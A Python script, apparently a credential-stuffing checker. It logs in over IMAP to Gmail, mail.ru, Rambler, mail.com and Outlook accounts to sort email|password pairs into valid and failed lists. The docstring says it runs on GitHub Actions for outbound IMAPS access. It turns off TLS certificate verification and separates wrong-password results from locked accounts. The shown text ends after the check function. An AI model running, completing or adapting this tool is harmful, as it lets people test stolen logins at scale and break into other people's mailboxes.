"""Multi-provider email credential validator (gmail / mail.ru / rambler.ru / mail.com).
Runs on GH Actions (ubuntu) where IMAPS outbound is allowed. Reads creds via env CREDS_MULTI.

Output: valid_accounts.txt (email|password, one line per valid) + fail_accounts.txt.
"""
import imaplib
import ssl
import sys
import io
import os
from concurrent.futures import ThreadPoolExecutor

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

PROVIDERS = {
    "gmail.com":   ("imap.gmail.com", 993),
    "mail.ru":     ("imap.mail.ru", 993),
    "rambler.ru":  ("imap.rambler.ru", 993),
    "lenta.ru":    ("imap.rambler.ru", 993),
    "autorambler.ru": ("imap.rambler.ru", 993),
    "ro.ru":       ("imap.rambler.ru", 993),
    "mail.com":    ("imap.mail.com", 993),
    "usa.com":     ("imap.mail.com", 993),
    "email.com":   ("imap.mail.com", 993),
    "hotmail.com": ("outlook.office365.com", 993),
    "outlook.com": ("outlook.office365.com", 993),
    "live.com":    ("outlook.office365.com", 993),
}


def imap_host_for(email: str) -> str:
    dom = email.rsplit("@", 1)[-1].lower()
    if dom in PROVIDERS:
        return PROVIDERS[dom][0]
    return "imap.mail.com"


def check(entry):
    email, pwd = entry
    host = imap_host_for(email)
    try:
        client = imaplib.IMAP4_SSL(host, 993, ssl_context=SSL_CTX)
        try:
            client.login(email, pwd)
            code, _ = client.select("INBOX", readonly=True)
            return (email, pwd, "OK" if code == "OK" else "OK(noinbox)", "")
        except imaplib.IMAP4.error as e:
            msg = str(e).strip()
            up = msg.upper()
            if "AUTHENTICATIONFAILED" in up or "LOGIN FAILED" in up or "INVALID" in up:
                return (email, pwd, "FAIL", "wrong creds")
            if "LOCKED" in up or "UNAVAILABLE" in up:
                return (email, pwd, "LOCK", msg[:60])
            return (email, pwd, "FAIL", msg[:60])
        except Exception as e:
            return (email, pwd, "ERR", f"{type(e).__name__}"[:60])
        finally:
            try:
                client.logout()
            except Exception:
                pass
    except Exception as e:
        return (email, pwd, "CONN", f"{type(e).__name__}"[:60])
